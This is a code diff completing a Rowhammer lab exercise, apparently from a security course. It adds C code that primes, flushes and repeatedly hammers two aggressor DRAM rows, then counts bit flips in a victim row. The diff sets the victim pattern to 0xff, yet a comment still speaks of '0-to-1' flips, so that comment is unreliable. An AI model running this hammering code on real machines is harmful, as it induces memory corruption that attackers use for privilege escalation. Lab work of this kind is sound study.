@@ -7,10 +7,11 @@
 #define BANK_FUNC_CAND 0
 
 // TODO: Try different combinations of these parameters to find the best ones for the machine!
-#define VIC_DATA 0x00
+#define VIC_DATA 0xff
 #define AGG_DATA 0xff 
 
 #define NUM_HAMMER_ATTEMPTS 100
+#define HAMMER_BATCH_SIZE 64
 
 
 char *dram_to_str(uint64_t phys_ptr);
@@ -29,6 +30,47 @@ uint64_t hammer_addresses(uint64_t vict, uint64_t attA, uint64_t attB, uint64_t 
                       
     uint64_t foundFlips = 0;
     // TODO: Exercise 4-1
+
+    // Prime: fill exactly one DRAM row for the victim and each aggressor.
+    uint64_t vict_row = hp_base + (((vict - hp_base) >> 17) << 17);
+    uint64_t attA_row = attA & ~((uint64_t)COL_MASK);
+    uint64_t attB_row = attB & ~((uint64_t)COL_MASK);
+
+    memset((void*)vict_row, VIC_DATA, ROW_SIZE);
+    memset((void*)attA_row, AGG_DATA, ROW_SIZE);
+    memset((void*)attB_row, AGG_DATA, ROW_SIZE);
+
+    // Flush primed rows so later reads come from DRAM instead of cached data.
+    for (uint64_t offset = 0; offset < ROW_SIZE; offset += CACHELINE_SIZE) {
+        clflush((void*)(vict_row + offset));
+        clflush((void*)(attA_row + offset));
+        clflush((void*)(attB_row + offset));
+    }
+    mfence();
+
+    // Hammer: repeatedly alternate between the two aggressor rows.
+    // Batch the fence so each attempt spends more time activating DRAM rows.
+    volatile uint8_t *attA_ptr = (volatile uint8_t*)attA;
+    volatile uint8_t *attB_ptr = (volatile uint8_t*)attB;
+    for (uint64_t i = 0; i < HAMMERS_PER_ITER; i += HAMMER_BATCH_SIZE) {
+        for (uint64_t j = 0; j < HAMMER_BATCH_SIZE; j++) {
+            (void)*attA_ptr;
+            (void)*attB_ptr;
+            clflush(attA_ptr);
+            clflush(attB_ptr);
+        }
+        mfence();
+    }
+
+    // Probe: scan the victim row for any 0-to-1 bit flips.
+    volatile uint8_t *vict_ptr = (volatile uint8_t*)vict_row;
+    for (uint64_t offset = 0; offset < ROW_SIZE; offset++) {
+        uint8_t value = vict_ptr[offset];
+        if (value != VIC_DATA) {
+            foundFlips += __builtin_popcount((unsigned int)(value ^ VIC_DATA));
+        }
+    }
+
     return foundFlips; 
 }
 
